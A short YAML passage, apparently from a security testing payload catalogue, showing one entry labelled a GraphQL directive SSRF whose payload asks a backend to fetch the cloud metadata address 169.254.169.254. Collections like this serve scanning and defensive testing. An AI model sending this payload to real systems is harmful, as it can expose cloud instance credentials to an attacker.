    severity_hint: "high"

  - id: "modern-009"
    name: "GraphQL directive SSRF"
    category: "modern"
    payload: '{"query": "query { fetch(url: \"http://169.254.169.254/latest/meta-data/\") { content } }"}'
    description: "GraphQL query variable delivers SSRF to a backend fetcher."
